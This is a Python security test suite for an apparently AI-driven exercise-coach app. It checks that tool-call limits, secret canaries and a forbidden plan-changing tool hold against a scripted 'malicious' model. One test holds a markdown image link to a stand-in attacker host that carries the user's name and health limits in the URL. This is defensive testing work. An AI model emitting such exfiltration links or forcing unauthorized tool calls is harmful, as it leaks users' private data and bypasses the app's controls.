"""Adversarial regression checks; no provider credentials or external requests."""
from copy import deepcopy
from pathlib import Path
from types import SimpleNamespace
import unittest
from unittest.mock import patch
import coach
import engine
from test_engine import ready, logged

class SecurityTests(unittest.TestCase):
    def test_rejected_calls_record_sanitized_names_without_arguments(self):
        s = ready()
        ctx = coach.ToolContext(s)
        for name, args in [('get_plan', {'private': 'KEY_CANARY'}), ('KEY_CANARY', {}), ('apply_change', {}), ('get_last_session', [])]:
            with self.assertRaises(ValueError):
                ctx.call(name, args)
            self.assertEqual(s['events'][-1]['event'], 'tool')
            self.assertFalse(s['events'][-1]['valid'])
        self.assertNotIn('KEY_CANARY', str(s['events']))
        self.assertNotIn('apply_change', str(s['events']))

    def test_reads_are_copies_and_tool_budget_fails_closed(self):
        s = ready()
        before = deepcopy(s['plan'])
        ctx = coach.ToolContext(s)
        ctx.call('get_plan', {})['plan']['exercises'].clear()
        self.assertEqual(before, s['plan'])
        for _ in range(7):
            ctx.call('get_last_session', {})
        with self.assertRaises(ValueError):
            ctx.call('get_plan', {})
        self.assertFalse(s['events'][-1]['valid'])

    def test_read_before_proposal_and_mutating_tool_denied(self):
        s = logged()
        ctx = coach.ToolContext(s)
        with self.assertRaises(ValueError):
            ctx.call('propose_change', {'exercise_id': 'sit_to_stand', 'direction': 'harder'})
        ctx.call('get_plan', {})
        with self.assertRaises(ValueError):
            ctx.call('propose_change', {'exercise_id': 'sit_to_stand', 'direction': 'harder'})
        ctx.call('get_last_session', {})
        ctx.call('propose_change', {'exercise_id': 'sit_to_stand', 'direction': 'harder'})
        with self.assertRaises(ValueError):
            ctx.call('apply_change', {})
        self.assertEqual(s['plan']['exercises'][0]['reps'], 10)

    def test_provider_error_canary_never_leaks(self):
        s = logged()
        def failure(*_):
            raise RuntimeError('PRIVATE_KEY_CANARY')
        self.assertEqual(coach.coach_turn('Check in', s, runner=failure), coach.FALLBACK)
        self.assertNotIn('PRIVATE_KEY_CANARY', str(s))
        self.assertIsNone(s['pending_change'])

    def test_actual_adapter_stops_after_four_requests(self):
        from google.genai import types
        s = logged()
        response = SimpleNamespace(candidates=[SimpleNamespace(content=types.Content(role='model', parts=[
            types.Part(function_call=types.FunctionCall(name='get_plan', args={}))]))])
        with patch('google.genai.Client') as factory:
            generate = factory.return_value.__enter__.return_value.models.generate_content
            generate.return_value = response
            reply = coach.coach_turn('Check in', s, {'GEMINI_API_KEY': 'test-canary', 'MODEL': 'fixture'})
            self.assertEqual(generate.call_count, 4)
            options = factory.call_args.kwargs['http_options']
            self.assertEqual(options.timeout, 60000)
            self.assertEqual(options.retry_options.attempts, 1)
        self.assertEqual(reply, coach.FALLBACK)
        self.assertIsNone(s['pending_change'])
        self.assertNotIn('test-canary', str(s))

    def test_model_markdown_is_displayed_as_inert_text(self):
        from streamlit.testing.v1 import AppTest
        from test_app import AppTests
        helper = AppTests()
        at = helper.screened()
        payload = '![hello](https://attacker.invalid/collect?name=Maria&limits=knees)'
        at.session_state['zinc']['messages'] = [{'role': 'assistant', 'text': payload}, {'role': 'user', 'text': payload}]
        at.radio(key='page').set_value('Coach').run()
        self.assertFalse(at.exception)
        self.assertEqual(sum(t.value == payload for t in at.text), 2)
        self.assertFalse(any(payload in m.value for m in at.markdown))

    def test_invalid_sdk_call_clears_staged_proposal(self):
        s = logged()
        def malicious(message, ctx, secrets):
            ctx.call('get_plan', {})
            ctx.call('get_last_session', {})
            ctx.call('propose_change', {'exercise_id': 'sit_to_stand', 'direction': 'harder'})
            ctx.call('apply_change', {})
            return 'Done'
        self.assertEqual(coach.coach_turn('Check in', s, runner=malicious), coach.FALLBACK)
        self.assertIsNone(s['pending_change'])
        self.assertEqual(s['plan']['exercises'][0]['reps'], 10)

if __name__ == '__main__':
    unittest.main()
